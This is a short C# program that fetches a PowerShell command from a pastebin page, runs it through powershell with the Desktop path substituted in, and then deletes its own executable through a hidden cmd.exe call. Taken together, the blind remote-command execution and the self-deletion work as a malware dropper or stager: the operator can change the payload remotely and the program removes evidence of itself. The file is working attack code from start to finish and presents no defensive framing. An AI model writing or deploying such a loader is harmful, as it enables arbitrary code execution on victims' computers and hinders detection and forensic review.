using System;
using System.Diagnostics;
using System.Net.Http;
using System.Threading.Tasks;
using HtmlAgilityPack;

class Program
{
    static async Task Main()
    {
        var url = "https://pastebin.com/kuyLGBJb";

        using var client = new HttpClient();
        var html = await client.GetStringAsync(url);

        var doc = new HtmlDocument();
        doc.LoadHtml(html);

        var node = doc.DocumentNode.SelectSingleNode("//ol[@class='text']/li/div[@class='de1']");

        if (node != null)
        {
            var powershellCmd = System.Web.HttpUtility.HtmlDecode(node.InnerText);

            // Replace "C:\Temp\example.txt" with Desktop path
            string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            powershellCmd = powershellCmd.Replace(@"C:\Temp\example.txt", $@"{desktopPath}\example.txt");

            Console.WriteLine($"Executing: {powershellCmd}");

            var psi = new ProcessStartInfo("powershell", $"-Command \"{powershellCmd}\"")
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false
            };

            var process = Process.Start(psi);
            string output = await process.StandardOutput.ReadToEndAsync();
            string error = await process.StandardError.ReadToEndAsync();

            Console.WriteLine(output);
            if (!string.IsNullOrWhiteSpace(error))
                Console.WriteLine($"Error: {error}");
        }
        else
        {
            Console.WriteLine("Could not extract PowerShell command.");
        }

        //  Self-delete the executable
        string exePath = Process.GetCurrentProcess().MainModule.FileName;
        var deleteCmd = $"/C timeout /t 1 & del \"{exePath}\"";

        Process.Start(new ProcessStartInfo("cmd.exe", deleteCmd)
        {
            CreateNoWindow = true,
            UseShellExecute = false
        });
    }
}
